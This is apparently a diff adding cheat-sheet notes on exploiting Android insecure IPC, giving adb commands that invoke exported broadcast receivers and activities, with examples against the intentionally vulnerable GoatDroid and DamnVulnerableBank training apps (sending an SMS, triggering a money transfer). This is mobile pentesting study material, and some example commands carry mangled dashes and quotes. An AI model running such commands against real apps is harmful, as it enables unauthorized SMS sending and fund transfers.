@@ -1,0 +1,12 @@
+# ---------------------- start insecure ipc ---------------------- #
+    # ----- Exploit exported broadcast
+        adb shell am broadcast -a MyBroadcast -n <package_name>\<broadcast_name> --es <parameter_name> <parameter_value> --es <parameter_name> <parameter_value>
+        - example: 
+        am broadcast –a MyBroadcast –n org.owasp.goatdroid.fourgoats/.broadcastreceivers.SendSMSNowReceiver –-es phoneNumber 5554 -–es message “Hi there”
+
+    # ----- Exploit exported activity (implicit activity)
+        adb shell am start -n <package_name> -e <parameter_name> <parameter_value>
+        - example:
+            adb shell am start -n com.app.damnvulnerablebank/.SendMoney -e beneficiary_account_number '121212121212121212121212'
+
+# ----------------------   end insecure ipc ---------------------- #
